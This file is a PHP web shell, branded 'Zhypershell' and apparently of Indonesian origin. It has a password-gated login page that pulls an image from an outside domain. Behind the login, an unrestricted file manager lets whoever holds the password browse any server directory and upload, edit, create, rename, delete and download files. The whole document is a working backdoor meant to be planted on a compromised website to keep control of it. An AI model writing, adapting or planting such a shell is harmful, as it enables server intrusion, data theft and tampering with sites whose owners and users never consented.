<?php
session_start();
$password = "2d0b3d70fa5f5b48c237276fb2e621a5";

function login_shell()
{
?>
    <html>
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zhypershell Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: url('https://zhyper-shel.info/imgzhyper/mek.jpg') no-repeat center center;
            background-size: cover;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        .login-container {
            background: rgba(0, 0, 0, 0.7); /* Transparansi latar belakang form */
            padding: 20px;
            border-radius: 8px;
            color: #fff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            margin-top: 720px;
        }

        .login-container input[type="password"] {
            padding: 10px;
            margin-right: 10px;
            border: 1px solid #4e4e4e69;
            border-radius: 4px;
            background: transparent;
            color: #fff;
            outline: none;
        }

        .login-container input[type="password"]::placeholder {
            color: #666666;
        }

        .login-container input[type="submit"] {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            background: #4e4e4e69;
            color: #000000;
            cursor: pointer;
            outline: none;
        }

        .login-container input[type="submit"]:hover {
            background: #000;
        }

        .marquee-container {
            position: fixed;
            bottom: 0;
            left: 500px;
            right: 500px;
            height: 50px;
            overflow: hidden;
            background: rgba(0, 0, 0, 0);
            display: flex;
            align-items: center;
            color: #fff;
        }

        .marquee {
            white-space: nowrap;
            display: inline-block;
            padding-left: 75%;
            animation: marquee 10s linear infinite;
        }

        @keyframes marquee {
            from {
                transform: translateX(100%);
            }
            to {
                transform: translateX(-100%);
            }
        }
    </style>
</head>
<body>
    <div class="marquee-container">
        <div class="marquee">
            copyright © zhypershell
        </div>
    </div>
    <div class="login-container">
        <form action="" method="post">
            <div align="center">
                <input type="password" name="pass" placeholder="Password" required>
                <input type="submit" name="submit" value="Login">
            </div>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        header("refresh: 0;");
    } else {
        login_shell();
    }
}
?>
<?php
// Set directory root menjadi public_html
$root_dir = realpath(__DIR__);  // Ini mengatur root menjadi folder di mana file PHP ini disimpan
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

// Periksa jika direktori yang diminta valid dan dapat diakses
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $root_dir; // Jika direktori tidak valid, kembali ke root_dir
}

// Fungsi untuk menampilkan list file & folder, dengan folder di atas dan file di bawah
function listDirectory($dir)
{
    $files = scandir($dir);

    // Array untuk menyimpan folder dan file terpisah
    $directories = [];
    $regular_files = [];

    // Pisahkan folder dan file ke dalam array yang berbeda
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;  // Masukkan ke array folder
            } else {
                $regular_files[] = $file; // Masukkan ke array file biasa
            }
        }
    }

    // Tampilkan folder di atas
    foreach ($directories as $directory) {
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir . '/' . $directory) . '">📁 ' . $directory . '</a></td>';
        echo '<td>Folder</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a>
        </td>';
        echo '</tr>';
    }

    // Tampilkan file di bawah
    foreach ($regular_files as $file) {
        echo '<tr>';
        echo '<td>' . $file . '</td>';
        echo '<td>' . filesize($dir . '/' . $file) . ' bytes</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a>
        </td>';
        echo '</tr>';
    }
}

// Fungsi untuk menghapus file
if (isset($_GET['delete'])) {
    $file_to_delete = $current_dir . '/' . $_GET['delete'];
    if (is_file($file_to_delete)) {
        unlink($file_to_delete);
    }
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk download file
if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . $_GET['download'];
    if (is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

// Fungsi untuk rename file
if (isset($_POST['rename_file'])) {
    $old_name = $current_dir . '/' . $_POST['old_name'];
    $new_name = $current_dir . '/' . $_POST['new_name'];
    rename($old_name, $new_name);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk upload file
if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk mengedit file
if (isset($_POST['save_file'])) {
    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
    $new_content = $_POST['file_content'];
    file_put_contents($file_to_edit, $new_content);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk membuat file baru
if (isset($_POST['create_file'])) {
    $new_file_name = $_POST['new_file_name'];
    $new_file_path = $current_dir . '/' . $new_file_name;
    // Buat file baru dengan konten kosong
    file_put_contents($new_file_path, "");
    header("Location: ?dir=" . urlencode($_GET['dir']));
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>TripleDNN</title>
    <style>
        /* Styling dengan tema gelap (latar belakang hitam dan teks terang) */
        body {
            background-color: #121212;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
        }
        h2 {
            color: #BB86FC;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #333;
            color: #BB86FC;
        }
        tr:nth-child(even) {
            background-color: #222;
        }
        tr:nth-child(odd) {
            background-color: #121212;
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: #03DAC6;
            color: #121212;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 100%;
            height: 400px;
            background-color: #222;
            color: #E0E0E0;
            border: 1px solid #BB86FC;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: #222;
            border: 1px solid #BB86FC;
            padding: 10px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .form-container form {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <p>Current Directory: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #03DAC6;"><?php echo $current_dir; ?></a></p>
    
    <div class="form-container">
        <!-- Form untuk upload file -->
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>

        <!-- Form untuk membuat file baru -->
        <form method="post">
            <input type="text" name="new_file_name" placeholder="New file name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>
    </div>

    <table border="1">
        <thead>
            <tr>
                <th>File Name</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>

    <!-- Form untuk rename file -->
    <?php if (isset($_GET['rename'])): ?>
    <form method="post">
        <input type="hidden" name="old_name" value="<?php echo $_GET['rename']; ?>">
        <input type="text" name="new_name" placeholder="New name" style="width: 100%; padding: 10px;">
        <button type="submit" name="rename_file">Rename</button>
    </form>
    <?php endif; ?>

    <!-- Form untuk mengedit file -->
    <?php
    if (isset($_GET['edit'])):
        $file_to_edit = $current_dir . '/' . $_GET['edit'];
        if (is_file($file_to_edit)) {
            $file_content = file_get_contents($file_to_edit);
            ?>
            <form method="post">
                <input type="hidden" name="file_name" value="<?php echo $_GET['edit']; ?>">
                <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
                <br>
                <button type="submit" name="save_file">Save Changes</button>
            </form>
        <?php }
    endif; ?>
</body>
</html>
